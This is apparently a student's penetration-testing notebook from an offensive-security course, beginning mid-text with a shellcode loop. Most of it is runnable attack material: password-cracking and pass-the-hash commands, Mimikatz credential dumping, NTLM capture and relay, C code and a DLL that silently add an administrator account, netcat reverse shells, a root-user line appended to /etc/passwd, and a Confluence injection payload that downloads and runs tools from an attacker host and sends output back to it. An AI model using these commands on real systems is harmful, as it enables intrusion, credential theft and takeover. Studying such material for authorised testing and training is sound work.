for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};
```
powershell unrestricted execution

```
Get-ExecutionPolicy -Scope CurrentUser
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
Get-ExecutionPolicy -Scope CurrentUser
```

use shellter for modifying exes
```
shellter
```

for anonymous ftp, username is 'anonymous'

```
User:  anonymous
Password:  anonymous@domain.com
```

for active ftp session do:
```
ftp -A $ip
```

binary -> allows transfer of binary files

Use Veil as an alternative to shellter for creating .bat files

```
/usr/share/veil/Veil.py
```

## Password cracking 
### Hydra 
ssh
```
hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201
```

rdp
```
hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202
```

ftp
```
hydra -l itadmin -P /usr/share/wordlists/rockyou.txt -s 21 ftp://$addr
```

for http post login
login_location:form_params:error_message
```
hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
```

use `sed` to delete passwords from lists that dont match policy

```
sed -i '/^1/d' demo.txt 
```


hashcat rule -- use ^ to prepend and $ to append
c rule capitalizes first letter
make sure rules are on same line

```
echo \$1 > demo.rule
hashcat -r demo.rule --stdout demo.txt
```

run haswhcat with rule
```
hashcat -m 0 crackme.txt /usr/share/wordlists/rockyou.txt -r demo3.rule --force
```

rules located in  /usr/share/hashcat/rules

hash cracking methodology

```
    Extract hashes
    Format hashes
    Calculate the cracking time
    Prepare wordlist
    Attack the hash
```

can identify hash with `hash-identifier` or `hashid


recursive find powershell
```
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```
keepass2john dumps keepass db to a hash
```
ikeepass2john Database.kdbx > keepass.hash
```

find hashcat most for keepass

```
hashcat --help | grep -i "KeePass"
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force

```


ssh location for users 

`../../../../../../../..//home/$user/.ssh/id_rsa`


### Windows password hash

use Mimikatz to transfer password hashes
 we can only extract passwords if we are running Mimikatz as Administrator (or higher) and have the SeDebugPrivilege10 access right enabled.
We can also elevate our privileges to the SYSTEM account with tools like PsExec11 or the built-in Mimikatz token elevation function12 to obtain the required privileges.

check which users on windows system with `Get-LocalUser`

mimikatz commands look like module::command

`sekurlsa::logonpasswords` gets all plaaintext passwords and hashes (huge output)
`lsadump::sam` gets all NLTM hashes

need both debug access and token elevation to run the above commands

```
privilege::debug
token::elevate

lsadump::sam
```
LTM hash with hashcat
```
hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

### Pass-the-hash

some services allow username + password hash, but we have to use the right tools

for SMB we can use smbclient

```
smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b

>get secrets.txt
```

we can use impacket psexec.py and wmiexec.py for executiom

psexec.py fo reverse shell
format for the -hashes arg is LMHash:NTHash
```
impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
```

Due to the nature of psexec.py, we'll always receive a shell as SYSTEM instead of the user we used to authenticate.o

use impacket-wmiexec to exec shell as user you auth'd with
```
impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
```

### Net-NTLMv2
need to use this when we don't have admin access
key idea: ask target to auth with us thhen print the hash they used

commands to get user privileges
```
whoami
net user paul
```

before running Responder, need to list interfaces and attach it to one

```
ip a
sudo responder -I tun0
```

then we need to request access on non-existent SMB share on our server

```
dir \\192.168.119.2\test
```

save the hash and fire up hashcat
```
hashcat --help | grep -i "ntlm"
hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force
```

** Note: can use burp to intercept file upload request then send to malicious SMB share
\\192.168.45.235\test

### Relaying NTLM

use impacket-ntlmrelayx

```
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc JABjAGwAaQBlAG4AdA..." 
```

if UAC enabled we must run as Admin

powershell get smb share

```
Get-ChildItem \\192.168.45.235\share
```
## Privilege Escalation

### Windows

Need to gather info

```
- Username and hostname
- Group memberships of the current user
- Existing users and groups
- Operating system, version and architecture
- Network information
- Installed applications
- Running processes
```

The hostname often can be used to infer the purpose and type of a machine. For example, if it is WEB01 for a web server or MSSQL01 for a MSSQL1 server.

user/hostname
```
whoami
whoami /groups
```
existing users and groups
```
powershell
Get-LocalUser
Get-LocalGroup
```

get the members of a group
```
Get-LocalGroupMember adminteam
```

get OS version
```
systeminfo
```
network info
```
ipconfig /all
```

routing
```
route print
```

active connections
```
netstat -ano
```

get 32 bit programs installed
```
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

64 bit programs
```
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

This list above only shows completed downloads. Should also check Downloads and Program Files


Find running processes
```
Get-Process
```

Note that sometimes for listing installed apps, `select displayname` is not enough

```
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

Search for *.kdbx from root dir
```
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```

can also include multiple files, .ini and .txt are common for xampp

```
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
```

search for all documents
```
Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
```

info about a user
```
net user steve
```

Can use Runas if access to GUI.  If no access to GUI try RDP or Winrm
```
runas /user:backupadmin cmd
```

### Powershell Info
Get-History for basic history but this is often deleted

```
Get-History
```

Use PSReadline to get history file
```
(Get-PSReadlineOption).HistorySavePath
type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

creating a PowerShell remoting session via WinRM in a bind shell like we used in this example can cause unexpected behavior

To avoid any issues, let's use evil-winrm12 to connect to CLIENTWK220 via WinRM from our Kali machine instead. 

```
evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123\!\!"
```
use `iwr` command in windows to download a remote file
```
iwr -uri http://192.168.118.2/winPEASx64.exe -Outfile winPEAS.exe
```
### Service Binary Hijacking

Get windows services and their path
```
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```

use `icacls` on windows for file permissions
```
icacls "C:\xampp\apache\bin\httpd.exe"
```

if we spot a service with misconfigured permissions
```
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}
```

then cross-compile
```
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```

and move it to the windows machine, then overwrite the original while keeping a backup
```
iwr -uri http://192.168.119.3/adduser.exe -Outfile adduser.exe
move C:\xampp\mysql\bin\mysqld.exe mysqld.exe
move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
```

to start and stop services you need to be an admin
```
net stop mysql
```

Since we do not have permission to manually restart the service, we must consider another approach. If the service Startup Type is set to "Automatic", we may be able to restart the service by rebooting the machine.

```
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
```

need to check if have permissions to restart system
```
whoami /priv
```

NOTE: the enabled/disabled only apply to the whoami process -- so just ignore it. all listed privileges are accessible by the user

we shutdown a service as follows:
```
shutdown /r /t 0 
```

can use Powerup.ps1 to detect misconfigurations
use -ep to start powershell with execution bypass
```
iwr -uri http://192.168.119.3/PowerUp.ps1 -Outfile PowerUp.ps1
powershell -ep bypass
. .\PowerUp.ps1
Get-ModifiableServiceFile
```

PowerUp also provides us an AbuseFunction, which is a built-in function to replace the binary and, if we have sufficient permissions, restart it. The default behavior is to create a new local user called john with the password Password123! and add it to the local Administrators group.
```
Install-ServiceBinary -Name 'mysql'
```

### Service DLL Hacking
Can use Process Monitor to display info about process and detect missing DLLs

Restart service in powershell
```
Restart-Service BetaService
```

get path windows
```
$env:path
```

basic microsoft dll
```
BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

malicious dll
```
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user dave2 password123! /add");
  	    i = system ("net localgroup administrators dave2 /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

for cross-compiling a dll we need to add the --shared flag
```
x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll
```

### Unquoted Service Paths

We can use this attack when we have Write permissions to a service's main directory or subdirectories but cannot replace files within them.

use wmic to find unquoted service paths (only works in cmd)
```
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
```
can also use Powerup to identify unquoted services
```
iwr http://192.168.119.3/PowerUp.ps1 -Outfile PowerUp.ps1
powershell -ep bypass
. .\PowerUp.ps1
Get-UnquotedService
```

we can then use Powerup to create new user binary
```
Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"
Restart-Service GammaService
net user
net localgroup administrators
```

powerup fails you can use this
```
Import-Module .\PowerUp.ps1
```

### Scheduled Tasks

```

    As which user account (principal) does this task get executed?
    What triggers are specified for the task?
    What actions are executed when one or more of these triggers are met?
```

get list of scheduled tasks
```
schtasks /query /fo LIST /v

schtasks /query /fo LIST /v | findstr "Taskname"
```

### Using Exploits

can abuse SEImpersonatePrivilege through named pipes
```
whoami /priv
```

can use PrintSpoofer to elevate privileges
```
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe


powershell
iwr -uri http://192.168.119.2/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
.\PrintSpoofer64.exe -i -c powershell.exe
```

 Variants from the Potato9 family (for example RottenPotato, SweetPotato, or JuicyPotato) are such tools. We should take the time to study these tools as they are an effective alternative to PrintSpoofer. Variants from the Potato9 family (for example RottenPotato, SweetPotato, or JuicyPotato) are such tools. We should take the time to study these tools as they are an effective alternative to PrintSpoofer.

also lookfor the privilege `SEBackupPrivilege` can be in the following steps

https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/
```
cd c:\
mkdir Temp
reg save hklm\sam c:\Temp\sam
reg save hklm\system c:\Temp\system
```
then transfer files to kali and use pypykatz to get hash
```
pypykatz registry --sam sam system
```

from here we can use evil-winmrm to pass hash (if allowed)
```
evil-winrm -i 192.168.1.41 -u raj -H "##Hash##"
```

or use netcat to crack the hash
```
hashcat -m 1000 a.pass /usr/share/wordlists/rockyou.txt
```

## Linux Privilege Escalation
### Manual Enumeration
to show uid and groups you are a part of

```
id
```
for all users look at etc/passwd
x in /etc/passwd means the password is in /usr/shadow
```
cat /etc/passwd
```
system services are configured with the /usr/sbin/nologin home folder, where the nologin statement is used to block any remote or local login for service accounts.

host nae
```
hostname
```

The /etc/issue and /etc/*-release files contain information about the operating system release and version. We can also run the uname -a command:
```
cat /etc/issue
cat /etc/os-release
uname -a
```

processes
```
ps aux
```

network interfaces
```
ip a

ifconfig
```

routing tables
```
route

routel
```

Finally, we can display active network connections and listening ports using either netstat12 or ss,13 both of which accept the same arguments.
```
ss -anp

netstat -anp
```

firewall rules (often need root priv)
```
cat /etc/iptables/rules.v4
```

scheduled cron tasks
```
ls -lah /etc/cron*
```

to list cron tasks
```
crontab -l

sudo crontab -l
```

list packages
```
dpkg -l
```

can use find command to find files or directories with misconfigured permissions
```
find / -writable -type d 2>/dev/null
```

use mount to list all file systems
/etc/fstab looks all drives mounted at boot
```
mount
cat /etc/fstab
```

view all disks
```
lsblk
```

list kernel modules
```
lsmod
```

to find out more info use /sbin/modinfo on module name
```
/sbin/modinfo $module_name
```
find set uid sticky bit binaries
```
find / -perm -u=s -type f 2>/dev/null
```

### Automated Enumeration

unix-privesc-check
```
unix-privesc-check
unix-privesc-check standard > output.txt
```

There are many other tools worth mentioning that are specifically tailored for Linux privilege escalation information gathering, including LinEnum3 and LinPeas,4 which have been actively developed and enhanced over recent years.

### User Trails

```
env
cat .bashrc
```

can use crunch command to generate a wordlist with a pattern
We'll set the minimum and maximum length to 6 characters, specify the pattern using the -t parameter, then hard-code the first three characters to Lab followed by three numeric digits.
```
crunch 6 6 -t Lab%%% > wordlist
```

then can brute force with hydra
```
hydra -l eve -P wordlist  192.168.50.214 -t 4 ssh -V
```

list sudo privs with
```
sudo -l
```

can elevate to root using
```
sudo -i
```

### Service Footprints

use watch to run ps -aux every second
```
watch -n 1 "ps -aux | grep pass"
```

tcpdump to capture network traffic
Let's try to capture traffic in and out of the loopback interface, then dump its content in ASCII using the -A parameter. Ultimately, we want to filter any traffic containing the "pass" keyword.

```
sudo tcpdump -i lo -A | grep "pass"
```

### Abusing cron jobs

can inspect the ccron log file
```
grep "CRON" /var/log/syslog
```

reverse shell one-liner to replace cron script
```
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.235 4444 >/tmp/f" >> user_backups.sh
````

### Abusing password auth
can add password hash to /etc/passwd

```
openssl passwd w00t
echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
su root2
```

### Abusing Setuid

serach for process 
```
ps u -C passwd
```

or can use proc
```
grep Uid /proc/1932/status
```

if th `find` utility jas setuid
 If the -p option is supplied at startup, the effective user id is not reset. 
```
find /home/joe/Desktop -exec "/usr/bin/bash" -p \;
```

can also abuse privileges via capabilities
```
/usr/sbin/getcap -r / 2>/dev/null
```

https://gtfobins.github.io/ to find exploitable binaries

```
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```
### Abusing sudo
can list sudo privs with
```
sudo -l
```
 permissions in /etc/sudoers

attempt to abuse tcpdump with sudo privilege
```
COMMAND='id'
TF=$(mktemp)
echo "$COMMAND" > $TF
chmod +x $TF
sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
```

it fails due tp app-armor, can verify in syslog

```
cat /var/log/syslog | grep tcpdump
```

can check app-armor status as root
```
 su - root
aa-status
```

### Kernel Exploits
enumerate kernel data
```
cat /etc/issue
uname -r 
arch
```

searchsploit
```
searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"   | grep  "4." | grep -v " < 4.4.0" | grep -v "4.8"
```

after finding exploit we must read it
```
cp /usr/share/exploitdb/exploits/linux/local/45010.c .
head 45010.c -n 20
```

if we have ssh access, we can SCP binary to target machine
```
scp cve-2017-16995.c joe@192.168.123.216:
```

then we can compile on their achine
```
gcc cve-2017-16995.c -o cve-2017-16995
```

PwnKit can be used for privesc on many kernels

https://www.exploit-db.com/exploits/50689


## Port Redirection and SSH Tunneling
### Linux
get network interfaces
```
ip addr
```

get routes
```
ip route
```

use socat to set up port forwarding
On CONFLUENCE01, we'll start a verbose (-ddd) Socat process. It will listen on TCP port 2345 (TCP-LISTEN:2345), fork into a new subprocess when it receives a connection (fork) instead of dying after a single connection, then forward all traffic it receives to TCP port 5432 on PGDATABASE01 (TCP:10.4.50.215:5432).

```
socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
```

now we can run psql client through the port forward
```
psql -h 192.168.50.63 -p 2345 -U postgres
```

on postgres the cwd_user table contains username and password
```
\c confluence
select * from cwd_user;
```

### SSH Local Port Forwarding
python tty shell
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
if port scanner not included we can do a bash for loop to discover services
```
for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445; done
```

A local port forward can be set up using OpenSSH's -L option, which takes two sockets (in the format IPADDRESS:PORT) separated with a colon as an argument (e.g. IPADDRESS:PORT:IPADDRESS:PORT). The first socket is the listening socket that will be bound to the SSH client machine. The second socket is where we want to forward the packets to. The rest of the SSH command is as usual - pointed at the SSH server and user we wish to connect as.

Let's create the SSH connection from CONFLUENCE01 to PGDATABASE01 using ssh, logging in as database_admin. We'll pass the local port forwarding argument we just put together to -L, and use -N to prevent a shell from being opened.
```
ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215
```

use ss to check ssh sessions
```
ss -ntplu
```

SMB get shares
```
smbclient -p 4455 -L //192.168.50.63/ -U hr_admin --password=Welcome123
smbclient -p 4455 //192.168.50.63/scripts -U hr_admin --password=Welcome1234
```

netcat for file transfers
On the receiving end running,
```
nc -l -p 1234 > out.file
```
will begin listening on port 1234.

On the sending end running,
```
nc -w 3 [destination] 1234 < out.file
```
will connect to the receiver and begin sending file.

### Dynamic Port Forwarding

Allows one listening socket to forward to multiple machines / ports

need a tty shell for this
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

In OpenSSH, a dynamic port forward is created with the -D option. The only argument this takes is the IP address and port we want to bind to. In this case, we want it to listen on all interfaces on port 9999. We don't have to specify a socket address to forward to. We'll also pass the -N flag to prevent a shell from being spawned.

```
ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215
```

Proxychains is a tool that can force network traffic from third party tools over HTTP or SOCKS proxies.
Proxychains uses a configuration file for almost everything, stored by default at /etc/proxychains4.conf. 
```
socks5 192.168.50.63 9999
```

prepend proxychains to command. also change host to final target host
```
proxychains smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234
```

Let's escalate this and port scan HRSHARES through our SOCKS proxy using Nmap. We'll use a TCP-connect scan (-sT), skip DNS resolution (-n), skip the host discovery stage (-Pn) and only check the top 20 ports (--top-ports=20)

```
proxychains nmap -vvv -sT --top-ports=20 -Pn 172.16.50.217
```

### SSH Remote Port Forwarding
have reverse shell ssh back to us then we forward packets from our machine
first need to start ssh
```
sudo systemctl start ssh
sudo ss -ntplu
```

In order to connect back to the Kali SSH server using a username and password you may have to explicity allow password-based authentication by setting PasswordAuthentication to yes in /etc/ssh/sshd_config.

use pty shell then setup remote port forwarding
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
```

On our Kali machine, we will use psql, passing 127.0.0.1 as the host (-h), 2345 as the port (-p), and using the database credentials of the postgres user (-U) we found earlier on CONFLUENCE01.

```
psql -h 127.0.0.1 -p 2345 -U postgres
```

### Remote Dynamic Port Forwarding
The remote dynamic port forwarding command is relatively simple, although (slightly confusingly) it uses the same -R option as classic remote port forwarding. The difference is that when we want to create a remote dynamic port forward, we pass only one socket: the socket we want to listen on the SSH server. We don't even need to specify an IP address; if we just pass a port, it will be bound to the loopback interface of the SSH server by default.

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
ssh -N -R 9998 kali@192.168.118.4
sudo ss -ntplu
```

then add `tail /etc/proxychains4.conf` to `/etc/proxychains4.conf`

can then run nmap like before
```
proxychains nmap -vvv -sT --top-ports=20 -Pn -n 10.4.50.64
```
### Sshuttle

 sshuttle1 is a tool that turns an SSH connection into something similar to a VPN by setting up local routes that force traffic through the SSH tunnel. However, it requires root privileges on the SSH client and Python3 on the SSH server, so it's not always the most lightweight option. In the appropriate scenario, however, it can be very useful.

first set up local port forwarding on server
```
socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
```

then on kali machine tell sshuttle which routes to go through ssh tunnel
```
sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24
```
now we an act as though we have access to new host
```
smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234
```

## Window SSH

### ssh.exe
Need ssh client > 7.6 for remote dynamic port forwarding
```
where ssh
ssh.exe -V
```

setup remote port forward
```
ssh -N -R 9998 kali@192.168.118.4
```

### Plink
Before OpenSSH was so readily available on Windows, most network administrators' tools of choice were PuTTY1 and its command-line-only counterpart, Plink. The Plink manual2:1 explains that much of the functionality the OpenSSH client offers is also built into Plink (although one notable feature Plink doesn't have is remote dynamic port forwarding).

first we want to start http server and download nc.exe to windows machine
```
sudo systemctl start apache2
find / -name nc.exe 2>/dev/null
find / -name nc.exe 2>/dev/null
sudo cp /usr/share/windows-resources/binaries/nc.exe /var/www/html/
```

can use powershell wget command to download file
```
powershell wget -Uri http://192.168.118.4/nc.exe -OutFile C:\Windows\Temp\nc.exe
```

setup nc listener
```
nc -nvlp 4446
```
run on windows
```
C:\Windows\Temp\nc.exe -e cmd.exe 192.168.118.4 4446
```

now downloaad plink.exe to windows
```
find / -name plink.exe 2>/dev/null
sudo cp /usr/share/windows-resources/binaries/plink.exe /var/www/html/
powershell wget -Uri http://192.168.118.4/plink.exe -OutFile C:\Windows\Temp\plink.exe
```

can setup remote port forward with the following
```
C:\Windows\Temp\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4
```

if we don't have a tty shell we'll have to attach echo y to the front
```
cmd.exe /c echo y | .\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.41.7
```

also need to be careful about windows logging our pw

now we can confirm remote port forwarding and connect via rdp
```
xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:127.0.0.1:9833
```

### Netsh

good for poking holes in firewall when we need port forwarding but firewall blocks it

Using this window, we can run Netsh. We'll instruct netsh interface to add a portproxy rule from an IPv4 listener that is forwarded to an IPv4 port (v4tov4). This will listen on port 2222 on the external-facing interface (listenport=2222 listenaddress=192.168.50.64) and forward packets to port 22 on PGDATABASE01 (connectport=22 connectaddress=10.4.50.215).

```
netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.64 connectport=22 connectaddress=10.4.50.215
```

check listening ports with netstat
```
netstat -anp TCP | find "2222"
```

We can also confirm that the port forward is stored by issuing the show all command in the netsh interface portproxy subcontext.
```
netsh interface portproxy show all
```

if port is blocked by firewall we have to set up a rule to allow connections
```
netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.50.64 localport=2222 action=allow
```

ssh should work now
```
ssh database_admin@192.168.50.64 -p2222
```
can delete the rule afterwards
```
netsh advfirewall firewall delete rule name="port_forward_ssh_2222"
```
can also delete the portproxy
```
netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.64
```
## Deep Packet Inspection

need chisel binary on client and server 
```
sudo cp $(which chisel) /var/www/html/
sudo systemctl start apache2
```

Next, we will build the wget command we want to run through the injection on CONFLUENCE01. This command will download the chisel binary to /tmp/chisel and make it executable:
```
wget 192.168.118.4/chisel -O /tmp/chisel && chmod +x /tmp/chisel
```
then use curl to execute command
```
curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27wget%20192.168.118.4/chisel%20-O%20/tmp/chisel%20%26%26%20chmod%20%2Bx%20/tmp/chisel%27%29.start%28%29%22%29%7D/
```

can check apache logs for requests
```
tail -f /var/log/apache2/access.log
```

Now that we have the Chisel binary on both our Kali machine and the target, we can run them. On the Kali machine, we'll start the binary as a server with the server subcommand, along with the bind port (--port) and the --reverse flag to allow the reverse port forward.

```
chisel server --port 8080 --reverse
```

Before we try to run the Chisel client, we'll run tcpdump on our Kali machine to log incoming traffic. We'll start the capture filtering to tcp port 8080 to only capture traffic on TCP port 8080.
```
sudo tcpdump -nvvvXi tun0 tcp port 8080
```

now we want this command to connect chisel client to server 
```
/tmp/chisel client 192.168.118.4:8080 R:socks > /dev/null 2>&1 &
curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20192.168.118.4:8080%20R:socks%27%29.start%28%29%22%29%7D/
```

however we get no connection, need to fetch error log
```
/tmp/chisel client 192.168.118.4:8080 R:socks &> /tmp/output; curl --data @/tmp/output http://192.168.118.4:8080/
curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20192.168.118.4:8080%20R:socks%20%26%3E%20/tmp/output%20%3B%20curl%20--data%20@/tmp/output%20http://192.168.118.4:8080/%27%29.start%28%29%22%29%7D/
```

need to get chisel 1.81 binaruy 
```
wget https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_amd64.gz
gunzip chisel_1.8.1_linux_amd64.gz
sudo cp ./chisel /var/www/html
```

force client to recopy
```
curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27wget%20192.168.118.4/chisel%20-O%20/tmp/chisel%20%26%26%20chmod%20%2Bx%20/tmp/chisel%27%29.start%28%29%22%29%7D/
```

we can then re-run command and chec connection
```
ss -ntplu
```

SSH doesn't offer a generic SOCKS proxy command-line option. Instead, it offers the ProxyCommand configuration option. We can either write this into a configuration file, or pass it as part of the command line with -o

use ncat for its proxy feature

Now we'll pass an Ncat command to ProxyCommand. The command we construct tells Ncat to use the socks5 protocol and the proxy socket at 127.0.0.1:1080. The %h and %p tokens represent the SSH command host and port values, which SSH will fill in before running the command. 

```
ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' database_admin@10.4.50.215
```

### DNS Tunneling
In order to simulate a real DNS setup, we can make FELINEAUTHORITY a functional DNS server using Dnsmasq.9 Dnsmasq is DNS server software that requires minimal configuration. A few Dnsmasq configuration files are stored in the ~/dns_tunneling folder, which we'll use as part of our DNS experiments. For this initial experiment, we'll use the very sparse dnsmasq.conf configuration file.

Now that the configuration is set, we'll start the dnsmasq process with the dnsmasq.conf configuration file (-C), making sure it runs in "no daemon" (-d) mode so it runs in the foreground. We can kill it easily again later.
```
sudo dnsmasq -C dnsmasq.conf -d
```

In another shell on FELINEAUTHORITY, we'll set up tcpdump10 to listen on the ens192 interface for DNS packets on UDP/53, using the capture filter udp port 53.
```
sudo tcpdump -i ens192 udp port 53
```

on target machine, Since DNS resolution is handled by systemd-resolved we can check the DNS settings using the resolvectl utility.
```
resolvectl status
```

use nslookup to get DNS info
```
nslookup
```

We can serve TXT records from FELINEAUTHORITY using Dnsmasq. First, we'll kill our previous dnsmasq process with a C+c. Then we'll check the contents of dnsmasq_txt.conf and run dnsmasq again with this new configuration.

```
# Do not read /etc/resolv.conf or /etc/hosts
no-resolv
no-hosts

# Define the zone
auth-zone=feline.corp
auth-server=feline.corp

# TXT record
txt-record=www.feline.corp,here's something useful!
txt-record=www.feline.corp,here's something else less useful.
```

### dnscat
We can use dnscat21 to exfiltrate data with DNS subdomain queries and infiltrate data with TXT (and other) records.

on server
```
dnscat2-server feline.corp
```
then need to move client binary to target

Now we'll start interacting with our session from the dnscat2 server. Let's list all the active windows with the windows command, then run window -i from our new "command" shell to list the available commands.
```
windows
window -i 1
?
```

Since we're trying to tunnel in this Module, let's investigate the port forwarding options. We can use listen to set up a listening port on our dnscat2 server, and push TCP traffic through our DNS tunnel, where it will be decapsulated and pushed to a socket we specify. Let's background our console session by pressing C+z. Back in the command session, let's run listen --help.

```
listen --help
```

Let's try to connect to the SMB port on HRSHARES, this time through our DNS tunnel. We'll set up a local port forward, listening on 4455 on the loopback interface of FELINEAUTHORITY, and forwarding to 445 on HRSHARES (done on client machine)

```
listen 127.0.0.1:4455 172.16.2.11:445
```

now we can SMB through DNS server
```
smbclient -p 4455 -L //127.0.0.1 -U hr_admin --password=Welcome1234
```

## Metasploit
```
sudo msfdb init
sudo systemctl enable postgresql
sudo msfconsole
db_status
help
```
To create a new workspace, we have to provide the workspace name as argument to -a.
```
workspace
workspace -a pen200
```

example nmap scan via msf
```
db_nmap
db_nmap -A 192.168.50.202
hosts
services
```

show module categories
```
show -h
```

### Auxiliarry Modules

show modules
```
show auxiliary
```

can search and filter by type
```
search type:auxiliary smb
```

after search we can use module number 
info commands gives us params / descript
```
use 56
info
show options
set RHOSTS 192.168.50.202
```

can also set options from results in db
```
unset RHOSTS
services -p 445 --rhosts
```

use run command to execute
can use vulns to get vulns detected in scan
```
run
vulns
```

can also do password attack. use creds command to gather found creds
```
search type:auxiliary ssh
use 15
show options
set PASS_FILE /usr/share/wordlists/rockyou.txt
set USERNAME george
set RHOSTS 192.168.50.201
set RPORT 2222
run
creds
```
### Exploit Modules

```
search Apache 2.4.49
use 0
info
```

